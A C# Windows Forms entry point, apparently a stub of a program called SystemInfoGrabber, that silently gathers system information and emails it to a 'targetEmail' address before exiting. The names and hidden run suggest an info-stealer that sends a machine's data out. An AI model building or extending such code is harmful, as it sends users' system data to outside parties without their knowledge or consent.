using System;
using System.Windows.Forms;
using SystemInfoGrabber.Services;

namespace SystemInfoGrabber;

internal static class Program
{
    /// <summary>
    ///  The main entry point for the application.
    /// </summary>
    [STAThread]
    private static void Main()
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);

        ExecuteBackgroundTask();

        // Exit the application
        Application.Exit();
    }

    private static void ExecuteBackgroundTask()
    {
        // 1. Initialization
        var coordinator = new SystemInfoCoordinator();

        // 2. Gathering System Info
        var systemInfo = coordinator.GatherSystemInformation();
        Console.WriteLine(systemInfo); // Just to see the gathered info in the console

        // 3. Sending Email
        // Assuming you have an EmailService class with a method SendEmail
        var emailService =
            new EmailService(); // You might need to pass parameters depending on your EmailService constructor
        emailService.SendEmail("targetEmail@email.com", "System Information", systemInfo);
    }
}
